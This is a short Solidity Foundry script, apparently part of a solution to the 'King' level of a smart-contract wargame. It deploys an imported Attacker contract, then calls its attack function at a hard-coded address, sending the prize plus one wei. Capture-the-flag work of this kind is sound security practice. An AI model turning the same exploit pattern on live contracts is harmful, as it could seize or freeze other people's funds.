// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "../src/09-King/Attacker.sol";

interface IAttacker{
    function attack() external payable;
}

contract DeployAttacker is Script{
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        vm.stopBroadcast();        
    }
}

contract DeployAttack is Script{
    address constant private DEPLOYED_ATTACKER_ADDRESS = 0x0dccCad22f4D58feD3f52bBf436AB08ab1C4879E;
    uint256 constant private CURRENT_PRIZE = 1000000000000000; 
    IAttacker attacker = IAttacker(DEPLOYED_ATTACKER_ADDRESS);
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker.attack{value: CURRENT_PRIZE + 1}();
        vm.stopBroadcast();
    }
}